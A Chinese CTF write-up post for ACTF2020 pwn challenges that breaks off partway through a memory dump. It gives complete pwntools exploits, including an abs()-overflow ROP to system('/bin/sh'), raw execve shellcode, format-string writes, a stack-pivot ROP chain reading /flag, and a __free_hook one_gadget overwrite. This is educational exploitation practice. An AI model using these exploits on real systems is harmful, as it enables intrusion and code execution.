---
title: ACTF2020 writeup
categories:
  - CTF
  - writeup
top_img: >-
  https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/ea6503c45cfe7010dd038787933e588c.jpg
cover: >-
  https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200213172719.png

date: 2020-02-12 23:04:06
tags: 
  - free_hook
  - ROP
  - 栈迁移
  - shell基础
  - php弱类型
  - abs函数漏洞
  - 整数溢出
  - shellcode
  - _IO_FILE
  - 格式化字符串漏洞
  - 逆向分析
  - 爆破
  - 动态调试
  - 自修改代码
  - 多线程
  - sql注入
  - python
  - githack
  - php文件包含
  - HTTP协议
  - 代码审计
  - md5绕过
  - XXE
  - 命令执行
  - 维吉尼亚
  - zip伪加密
  - RSA
  - AES
  - base64隐写
  - 文件修复
  - 流量分析
  - outguess隐写
  - CTF
  - writeup
  - pwn
  - web
  - misc
  - crypto
  - re
keywords:
description:
comments:
toc:
toc_number:
copyright:
mathjax:
katex:
hide:
---

# ACTF 2020

中南大学和河北师范大学联合举办的寒假新人赛~

比赛时间：2月1日10:00 - 2月14日20:00

本想着冒充萌新蹭一场新生赛，让我这个19级刚入学的真萌新涨涨姿势，但没想到第一天就被发现了QAQ

这次比赛总体来说比较适合入门，web题目貌似很简单，听[imagin](https://imagin.vip/)师傅说他刚开题就AK了...tql...作为一名二进制萌新，我主要做了re和pwn的题。pwn题比较基础，但还是学了不少新姿势，re就很烧脑了，不知掉了多少头发才做出来...不过很有意思鸭~

------

# Pwn

pwn两道堆的题目还是不会做，chk_rop想了很久也没pwn出来，最后剩了3道题，等官方wp出来好好学习一波...

## simple_rop

 - 题目描述：Not your abs!
 - 题目地址：[simple_rop](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/simple_rop/simple_rop)
 - 考察点：ROP攻击、abs函数漏洞、无符号整数
 - 难度：简单
 - 分值：100
 - 完成人数：4

首先分析程序，主要函数如下：

```c
int __cdecl sub_8048738(char *buf, int ptr){
  size_t size; // eax
  char v4[16]; // [esp+8h] [ebp-20h]
  int v5; // [esp+18h] [ebp-10h]
  int v6; // [esp+1Ch] [ebp-Ch]

  v5 = abs(ptr);
  if ( v5 < 0 ){
    v6 %= 32;
  }
  else{
    v6 = rand() % 16;
    buf[16 - v6] = 0;
  }
  size = strlen(buf);
  memcpy(&v4[v6], buf, size);
  return puts("copy over!");
}
```

其中`buf`中是之前`read`读的48字节数据，`ptr`是`scanf("%ud")`读的无符号整数，这里想要栈溢出，必须让`abs(ptr)<0`，否则`buf`会被随机截断...然鹅，取绝对值后的数肿么可能是负数呢！？？？百度了一下，原来`abs`函数存在漏洞：

> `abs`函数的返回值是有符号整数`int`，表示范围是`-2147483648~2147483647`
>
> 当`ptr=-2147483648`时，对应的绝对值是`2147483648`，超过了`int`的最大表示范围，产生溢出
>
> 溢出的结果是`-2147483648`，所以此时`abs`函数的返回值是个负数
>

此外，这题给的`ptr`是无符号整数，因此直接让`ptr=2147483648`，也可以实现有符号整数溢出



绕过了`abs`之后还有一个坑，`memcpy`的目的地址会加上`v6`，然鹅`v6`的值并不确定...我在本地攻击时`v6=2`，而远程攻击却失败了，原因就是本地和远程环境`v6`的值不一样...

解决办法是写个脚本，爆破一下`offset`（`v6`取值范围为`0~32`，对应`offset`取值范围`4~36`）

```
[+] copy over!
    You need search Rop
[+] right! offset=36
[*] Closed connection to 47.106.94.13 port 50012
```

爆破脚本如下：

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './simple_rop'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

system = elf.symbols['system']
binsh = 0x804a050
main = 0x804864B

flag = 0

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def exp(p,offset):        
    global flag
    # offset = 34
    payload = 'A'*offset
    # payload += p32(system) + p32(main) + p32(binsh)
    payload += p32(main)

    ru('Rop\n')
    sl(payload)
    sleep(1)
    ru('cursor: \n')
    # debug('b *0x8048785')
    sl('-2147483648')

    sleep(0.5)

    data = rc(1000)
    log.success(data)
    if 'You need search Rop' in data:
        log.success("right! offset="+str(offset))
        flag = 1
    else:
        log.warning("fail!  offset="+str(offset))

#  v6  off
#  0   36
#  2   34
#  32  4
offset = 36
while flag==0:
    if len(sys.argv) == 1:
        is_local = True
        p = process(local_file)
        libc = ELF(local_libc)
    elif len(sys.argv) > 1:
        is_remote = True
        if len(sys.argv) == 3:
            host = sys.argv[1]
            port = sys.argv[2]
        else:
            host, port = sys.argv[1].split(':')
        p = remote(host, port)
        libc = ELF(remote_libc)
    exp(p,offset)
    offset -= 1
    if offset <= 0:
        break
```

拿到远程的`offset`之后才是真正的`SIMPLE ROP`攻击...

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './simple_rop'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
# elf, libc
system = elf.symbols['system']
binsh = elf.search('/bin/sh').next()

# rop1
offset = 36
payload = 'A'*offset
payload += p32(system) + p32(0xdeadbeef) + p32(binsh)

sl(payload)

sleep(1)

sl('-2147483648')

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()
```

p.s.其实`docker`默认的操作系统是`Ubuntu16.04`，但是不可能为了做个题就装个虚拟机吧hhhh



## shellcode

 - 题目描述：Do you know stack ?
 - 题目地址：[shellcode](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/shellcode/shellcode)
 - 考察点：shellcode
 - 难度：入门
 - 分值：100
 - 完成人数：3

首先查看一下程序保护：

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

栈可执行，并且给了`jmp rsp`，因此直接跳到`shellcode`即可：

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './shellcode'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400783 # pop rdi ; ret
jrsp = 0x040070B

# elf, libc
shellcode = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'

# rop1
offset = 40
payload = shellcode.rjust(32,'\x90')
payload += p64(0)
payload += p64(jrsp)

ru('U have read 0day!\n')
debug()
sl(payload)

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()
```



## fmt32

 - 题目描述：random lucky
 - 题目地址：[fmt32](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/fmt32/fmt32)
 - 考察点：格式化字符串漏洞
 - 难度：入门
 - 分值：200
 - 完成人数：3

格式化字符串漏洞，给了俩随机数`a1,a2`，让`a1==2*a2`就给flag，最简单的做法是`a1=a2=0`，对应的payload为`%6$n%7$n`



## fmt64

 - 题目描述：thanks to xxx
 - 题目地址：[fmt64](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/fmt64/fmt64)
 - 考察点：格式化字符串漏洞、ROP、free_hook
 - 难度：中等
 - 分值：300
 - 完成人数：2

thanks to xxx? （应该不是我）这题我解出来的比较早，后来放了hint:

>hint1: stack pivot
>hint2: hook

嗯？hook...果然我最初的解法是非预期...

闲话少叙，回到正题，以下是非预期解：

### 非预期解

很明显是格式化字符串漏洞，要命的是保护全开了，`GOT`表，`fini_array`等函数指针只读，没法修改...

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

而且`printf`之后没有`ret`，直接就`exit(0)`了...所以改写返回地址也没用...

开启了`PIE`倒是没什么，反正也能通过格式化字符串漏洞各种泄漏，程序代码如下：

```c
void __fastcall __noreturn sub_9AF(FILE *a1){
  char format; // [rsp+10h] [rbp-110h]
  unsigned __int64 v2; // [rsp+118h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(&format, 0, 0x100uLL);
  while ( (unsigned int)read(0, &format, 0x100uLL) )
  {
    fprintf(a1, &format);
    sleep(1u);
  }
  exit(0);
}
```

`sleep()`中并没有什么能利用的，那就只有`exit()`了...

于是`gdb`跟进`exit()`，发现`ld-2.23.so`中有一处函数指针可改写：

```shell
 ► 0x7effca8f7b3e <_dl_fini+126>    call   qword ptr [rip + 0x216404] <0x7effca8e7c90>

pwndbg> x/4xg $rip + 0x216404+6
0x7effcab0df48 <_rtld_global+3848>:	0x00007effca8e7c90	0x00007effca8e7ca0
0x7effcab0df58 <_rtld_global+3864>:	0x00007effca8fb0b0	0x0000000000000006

pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
...
0x7effcab0c000 0x7effcab0d000 r--p 1000  25000 /lib/x86_64-linux-gnu/ld-2.23.so
0x7effcab0d000 0x7effcab0e000 rw-p 1000  26000 /lib/x86_64-linux-gnu/ld-2.23.so
0x7effcab0e000 0x7effcab0f000 rw-p 1000  0  
0x7ffe20323000 0x7ffe20344000 rw-p 21000 0     [stack]
```

虽然开了随机化，但是试了几次，这个函数指针和`libc`之间的偏移量是不变的，因此可以利用（感觉这个`_dl_fini`里的函数指针和`__libc_csu_fini`里面的指针差不多......）

本来想着用`one_gadget`一波带走这题，但想要执行`exit(0)`必须先退出`  while(read(0, &format, 0x100uLL))`这个循环，有两种方法可以退出循环：

- 关闭`stdin`：`p.stdin.close()`（适用于本地调试，打远程不行）
- 中断输入：`p.shutdown('send')` [ref](https://blog.csdn.net/Breeze_CAT/article/details/100087036)

不管用哪种方法，都没法继续向程序发送数据了，因此即使拿到`shell`也没用

于是，考虑构造`ROP`链，先`open /flag`再`read`+`write`把flag打印出来

跟进`_dl_fini`里面调用的那个函数，看下栈分布情况：

```shell
00:0000│ rsp  0x7ffe203411b8 —▸ 0x7effca8f7b44 (_dl_fini+132) 
01:0008│      0x7ffe203411c0 —▸ 0x7ffe203413d0 
02:0010│      0x7ffe203411c8 ◂— 0x3000000010
03:0018│      0x7ffe203411d0 —▸ 0x7ffe203412a0 ◂— 0x0
04:0020│      0x7ffe203411d8 —▸ 0x7ffe203411e0 ◂— 0x26 /* '&' */
05:0028│      0x7ffe203411e0 ◂— 0x26 /* '&' */
06:0030│      0x7ffe203411e8 —▸ 0x7ffe20341310 ◂— 0x0
07:0038│      0x7ffe203411f0 —▸ 0x7ffe203412b0 ◂— 'hhhhhhhh'
```

发现通过`read()`读的数据，与当前`rsp`离得并不远，于是可以把栈迁移到可控的区域：

需要用到两个`gadget`：

```
p6r   = 0x0013cc0f + libc_base
prsp  = 0x0000000000003838 + libc_base # pop rsp ; ret
```

第一个`gadget`把多余的6个参数`pop`掉，然后第二个`gadget`直接`pop rsp`把栈迁移到`read`读的`buf`

> P.s. libc中真是什么gadget都有鸭~太方便了！

这两个`libc`中的`gadget`需要通过格式字符串漏洞写到栈中（栈中位置也是相对固定的）

此前，还需要用格式化字符串漏洞泄漏下libc和栈地址：

- `libc`直接泄漏`libc_start_main_ret`
- 栈的话随便找一个就行...

完成栈迁移的`gadget`链如下：

```assembly
  0x7efe86626c0f <__nscd_getpwnam_r+63>    pop    rcx <0x7efe86ada040>
  0x7efe86626c10 <__nscd_getpwnam_r+64>    pop    rbx
  0x7efe86626c11 <__nscd_getpwnam_r+65>    pop    rbp
  0x7efe86626c12 <__nscd_getpwnam_r+66>    pop    r12
  0x7efe86626c14 <__nscd_getpwnam_r+68>    pop    r13
  0x7efe86626c16 <__nscd_getpwnam_r+70>    pop    r14
  0x7efe86626c18 <__nscd_getpwnam_r+72>    ret    
   ↓
  0x7efe864ed838                           pop    rsp
  0x7efe864ed839                           ret    
   ↓
  0x7efe8651d544 <__gettextparse+1140>     pop    rax ; read buf data
  0x7efe8651d545 <__gettextparse+1141>     ret    
```

读`flag`的`ROP`链如下：

open

```assembly
   0x7fd8c2bf2102 <iconv+194>            pop    rdi
   0x7fd8c2bf2103 <iconv+195>            ret    
    ↓
   0x7fd8c2bf12e8 <init_cacheinfo+40>    pop    rsi
   0x7fd8c2bf12e9 <init_cacheinfo+41>    ret    
    ↓
   0x7fd8c2bd2b92                        pop    rdx
 ► 0x7fd8c2bd2b93                        ret             
    ↓
   0x7fd8c2cc8030 <open64>               cmp    dword ptr [rip + 0x2d2709], 0 <0x7fd8c2f9a740>
   0x7fd8c2cc8037 <open64+7>             jne    open64+25 <0x7fd8c2cc8049>
   0x7fd8c2cc8039 <__open_nocancel>      mov    eax, 2
   0x7fd8c2cc803e <__open_nocancel+5>    syscall 
   0x7fd8c2cc8040 <__open_nocancel+7>    cmp    rax, -0xfff
```

read

```assembly
   0x7fd8c2bf2102 <iconv+194>            pop    rdi
   0x7fd8c2bf2103 <iconv+195>            ret    
    ↓
   0x7fd8c2bf12e8 <init_cacheinfo+40>    pop    rsi
   0x7fd8c2bf12e9 <init_cacheinfo+41>    ret    
    ↓
   0x7fd8c2bd2b92                        pop    rdx
 ► 0x7fd8c2bd2b93                        ret             
    ↓
   0x7fd8c2cc8250 <read>                 cmp    dword ptr [rip + 0x2d24e9], 0 <0x7fd8c2f9a740>
   0x7fd8c2cc8257 <read+7>               jne    read+25 <0x7fd8c2cc8269>
 
   0x7fd8c2cc8259 <__read_nocancel>      mov    eax, 0
   0x7fd8c2cc825e <__read_nocancel+5>    syscall 
```

write

```assembly
   0x7fd8c2bf2102 <iconv+194>             pop    rdi
   0x7fd8c2bf2103 <iconv+195>             ret    
    ↓
   0x7fd8c2bf12e8 <init_cacheinfo+40>     pop    rsi
   0x7fd8c2bf12e9 <init_cacheinfo+41>     ret    
    ↓
   0x7fd8c2bd2b92                         pop    rdx
 ► 0x7fd8c2bd2b93                         ret            
    ↓
   0x7fd8c2cc82b0 <write>                 cmp    dword ptr [rip + 0x2d2489], 0 <0x7fd8c2f9a740>
   0x7fd8c2cc82b7 <write+7>               jne    write+25 <0x7fd8c2cc82c9>
 
   0x7fd8c2cc82b9 <__write_nocancel>      mov    eax, 1
   0x7fd8c2cc82be <__write_nocancel+5>    syscall 
```

> libc gadget真好用:D

exp:

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './fmt64'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc-2.23.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def leak_addr(pos):
    sl('LLLLLLLL%%%d$p'%(pos))
    return rc()[8:-1]

def show(addr):
    payload = "%10$s".ljust(24,'S')
    payload += p64(addr)
    sl(payload)
    return rc()

def alter_byte(addr,data):
    if data==0:
        payload = "%10$hhn"
    else:
        payload = "%%%dc%%10$hhn"%(data)
    payload = payload.ljust(24,'T')
    payload += p64(addr)
    sl(payload)
    return rc()

def alter_dw(addr,data):
    alter_byte(addr,data&0xff)
    alter_byte(addr+1,(data>>8)&0xff)
    alter_byte(addr+2,(data>>16)&0xff)
    alter_byte(addr+3,(data>>24)&0xff)

def alter_qw(addr,data):
    alter_dw(addr,data)
    alter_dw(addr+4,data>>32)

def flush(c='F'):
    sl(c*8+'\0'*0x80)
    rc()

# info
# elf, libc
ru('This\'s my mind!\n')

# leak libc base
offset___libc_start_main_ret = 0x20830
libc_base = int(leak_addr(46),16)-offset___libc_start_main_ret
info_addr('libc_base',libc_base)

# ld-2.23 dl_fini (function array)
ld_ptr = libc_base + 0x5f0f48  #_dl_fini
info_addr('ld_ptr',ld_ptr)
# option
info_addr('raw func in ptr',u64(show(ld_ptr)[:6]+'\x00\x00'))

# gadget
p6r   = 0x0013cc0f + libc_base
prsp  = 0x0000000000003838 + libc_base # pop rsp ; ret
prdi  = 0x0000000000021102 + libc_base # pop rdi ; ret
prsi  = 0x00000000000202e8 + libc_base # pop rsi ; ret
prdx  = 0x0000000000001b92 + libc_base # pop rdx ; ret
libc_open  = libc.symbols['open'] + libc_base
libc_read  = libc.symbols['read'] + libc_base
libc_write = libc.symbols['write'] + libc_base

flush()
# leak stack 
stack_base = int(leak_addr(41),16)
info_addr('stack_base',stack_base)

# calc pivot stack 
#pwndbg> p 0x7ffc3c28fc58-0x7ffc3c28fe40
#$1 = -488
prsp_addr  = stack_base - 488

# prepare to stack pivot
# g1
log.success("write p6r:"+hex(p6r)+" to "+hex(ld_ptr));
alter_dw(ld_ptr, p6r)
# g2
log.success("write prsp:"+hex(prsp)+ " to "+hex(prsp_addr));
alter_qw(prsp_addr, prsp)
# stack pivot to read buf

# start rop
ropchain = [
            # open('/flag',0,0x100)
            p64(prdi), p64(stack_base-112),# -> /flag
            p64(prsi), p64(0),
            p64(prdx), p64(0x100),
            p64(libc_open),
            # read(0,buf,0x100)
            p64(prdi), p64(3),
            p64(prsi), p64(stack_base),
            p64(prdx), p64(0x100),
            p64(libc_read),
            # write(1,buf,0x100)
            p64(prdi), p64(1),
            p64(prsi), p64(stack_base),
            p64(prdx), p64(0x100),
            p64(libc_write),
            p64(0xdeadbeef),
            '/flag\0\0\0'
]

# debug('b *'+hex(p6r))

flush('\x90')
sl(''.join(ropchain))

# close stdin to break loop (so one_gadget does not work)
# p.stdin.close()
# shutdown sent also work
p.shutdown("send") 

p.interactive()
```

> p.s.做`simple_rop`的时候还说没必要专门搞个`Ubuntu16`的环境，结果做这题时就装个虚拟机....真香

------

>  pp.s.以上是我的菜鸡解法......

### 预期解

后来看到了[0CTF 2017 Quals: EasiestPrintf](https://poning.me/2017/03/23/EasiestPrintf/) 原来`scanf`和`printf`都有可能触发`malloc`和`free`

>  `printf("%100000c");`的时候就会触发`malloc`申请字符缓冲区，用完后会`free`掉缓冲区

因此...直接改`__free_hook`为`one_gadget`，然后输入`"%100000c"`触发`free`就拿到shell了......

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './fmt64'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc-2.23.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def leak_addr(pos):
    sl('LLLLLLLL%%%d$p'%(pos))
    return rc()[8:-1]

def show(addr):
    payload = "%10$s".ljust(24,'S')
    payload += p64(addr)
    sl(payload)
    return rc()

def alter_byte(addr,data):
    if data==0:
        payload = "%10$hhn"
    else:
        payload = "%%%dc%%10$hhn"%(data)
    payload = payload.ljust(24,'T')
    payload += p64(addr)
    sl(payload)
    return rc()

def alter_dw(addr,data):
    alter_byte(addr,data&0xff)
    alter_byte(addr+1,(data>>8)&0xff)
    alter_byte(addr+2,(data>>16)&0xff)
    alter_byte(addr+3,(data>>24)&0xff)

def alter_qw(addr,data):
    alter_dw(addr,data)
    alter_dw(addr+4,data>>32)

def flush(c='F'):
    sl(c*8+'\0'*0x80)
    rc()

# info
# elf, libc
ru('This\'s my mind!\n')

# leak libc base
if is_remote:
    offset___libc_start_main_ret = 0x20830
    offset_one_gadget = 0xf02a4  # execve("/bin/sh", rsp+0x50, environ)
if is_local:
    offset___libc_start_main_ret = 0x26b6b
    offset_one_gadget = 0x106ef8 # execve("/bin/sh", rsp+0x70, environ)

libc_base = int(leak_addr(46),16)-offset___libc_start_main_ret
info_addr('libc_base',libc_base)

free_hook = libc_base + libc.symbols['__free_hook']
info_addr('free_hook',free_hook)

one_gadget = libc_base + offset_one_gadget
info_addr('one_gadget',one_gadget)

log.success('write one_gadget to free_hook')
alter_qw(free_hook, one_gadget)

sl("%100000c")

p.interactive()
```

> 我太菜了...T^T



## Complaint

 - 题目描述：尽情地Make Complaints！
 - 题目地址：[complaint](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/complaint/complaint)
 - 考察点：Off-by-one（官方）、覆盖_IO_FILE（非预期）
 - 难度：中等
 - 分值：200
 - 完成人数：4

显然是个堆的题，然鹅我并不会利用，看了一下，还有别的漏洞，于是硬是给解出来了...

主要的漏洞如下：

```c
unsigned __int64 mod(){
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("The complaint index you want to modify:");
  __isoc99_scanf("%d", &v1);
  if ( ptr[v1] ){
    printf("Input your complaint:", &v1);
    read(0, ptr[v1], *(&n + v1));
  }
  return __readfsqword(0x28u) ^ v2;
}
```

```c
unsigned __int64 show(){
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("The complaint index you want to show:");
  __isoc99_scanf("%d", &v1);
  if ( ptr[v1] ){
    puts("Your complaint: ");
    write(1, ptr[v1], *(&n + v1));
    puts(&byte_400FF7);
  }
  return __readfsqword(0x28u) ^ v2;
}
```

`mod()`函数用于修改`ptr[v1]`中的内容，`show()`用于打印`ptr[v1]`的内容

这个`ptr`在`bss`段，`v1`通过`scanf`读入，可以是负数，所以只要顺着`ptr`往上找，找到`ptr[v1]`不为零的内存区域，就可以触发`read/write`函数；
`read/write`函数的第三个参数是`n[v1]`，`n`也是在`bss`段，所以只要顺着`n`往上找，找到`n[v1]`不为零的内存区域，就可以通过`read/write`，往`ptr[v1]`中读一坨数据或是从其中泄漏一坨数据。

`bss`段数据的布局如下：

```assembly
.bss:00000000006020A0 ; FILE *stdout
.bss:00000000006020A0 stdout          dq ?                    
.bss:00000000006020B0 ; FILE *stdin
.bss:00000000006020B0 stdin           dq ?                    
.bss:00000000006020C0 ; FILE *stderr
.bss:00000000006020C0 stderr          dq ?                    
.bss:00000000006020C8 byte_6020C8     db ?                    
.bss:00000000006020E0 ; char *src
.bss:00000000006020E0 src             dq ?                    
.bss:0000000000602100 ; size_t n
.bss:0000000000602100 n               dd ?                    
.bss:0000000000602140 ; char *ptr[16]
.bss:0000000000602140 ptr             dq ?                    
```

这题巧了，当`v1=-16`时：

> `ptr[v1]`=`0x602140+8*(-16)`=`0x6020c0(stderr)`指向`_IO_2_1_stderr_`
> `n[v1]`=`0x602100+4*(-16)`=`0x6020c0`也指向`_IO_2_1_stderr_`，其中的值`flags=0xfbad2087`

```shell
pwndbg> x/xg 0x6020c0
0x6020c0 <stderr>:	0x00007fce72a43540
pwndbg> x/xg stderr
0x7fce72a43540 <_IO_2_1_stderr_>:	0x00000000fbad2087
```

于是，`mod(-16)`可以向`_IO_2_1_stderr_` 写入`0xfbad2087`字节数据，用于覆盖`_IO_FILE`结构体

`show(-16)`可以从`_IO_2_1_stderr_`读出`0xfbad2087`字节数据，用于泄漏libc

`_IO_2_1_stderr_`其后的内存分布如下：

```assembly
pwndbg> x/200xg 0x7fce72a43540
0x7fce72a43540 <_IO_2_1_stderr_>:	0x00000000fbad2087	0x00007fce72a435c3
0x7fce72a43550 <_IO_2_1_stderr_+16>:	0x00007fce72a435c3	0x00007fce72a435c3
0x7fce72a43560 <_IO_2_1_stderr_+32>:	0x00007fce72a435c3	0x00007fce72a435c3
0x7fce72a43570 <_IO_2_1_stderr_+48>:	0x00007fce72a435c3	0x00007fce72a435c3
0x7fce72a43580 <_IO_2_1_stderr_+64>:	0x00007fce72a435c4	0x0000000000000000
0x7fce72a43590 <_IO_2_1_stderr_+80>:	0x0000000000000000	0x0000000000000000
0x7fce72a435a0 <_IO_2_1_stderr_+96>:	0x0000000000000000	0x00007fce72a43620
0x7fce72a435b0 <_IO_2_1_stderr_+112>:	0x0000000000000002	0xffffffffffffffff
0x7fce72a435c0 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007fce72a44770
0x7fce72a435d0 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
0x7fce72a435e0 <_IO_2_1_stderr_+160>:	0x00007fce72a42660	0x0000000000000000
0x7fce72a435f0 <_IO_2_1_stderr_+176>:	0x0000000000000000	0x0000000000000000
0x7fce72a43600 <_IO_2_1_stderr_+192>:	0x0000000000000000	0x0000000000000000
0x7fce72a43610 <_IO_2_1_stderr_+208>:	0x0000000000000000	0x00007fce72a416e0
0x7fce72a43620 <_IO_2_1_stdout_>:	0x00000000fbad2887	0x00007fce72a436a3
0x7fce72a43630 <_IO_2_1_stdout_+16>:	0x00007fce72a436a3	0x00007fce72a436a3
0x7fce72a43640 <_IO_2_1_stdout_+32>:	0x00007fce72a436a3	0x00007fce72a436a3
0x7fce72a43650 <_IO_2_1_stdout_+48>:	0x00007fce72a436a3	0x00007fce72a436a3
0x7fce72a43660 <_IO_2_1_stdout_+64>:	0x00007fce72a436a4	0x0000000000000000
0x7fce72a43670 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7fce72a43680 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007fce72a428e0
0x7fce72a43690 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7fce72a436a0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007fce72a44780
0x7fce72a436b0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
0x7fce72a436c0 <_IO_2_1_stdout_+160>:	0x00007fce72a427a0	0x0000000000000000
0x7fce72a436d0 <_IO_2_1_stdout_+176>:	0x0000000000000000	0x0000000000000000
0x7fce72a436e0 <_IO_2_1_stdout_+192>:	0x00000000ffffffff	0x0000000000000000
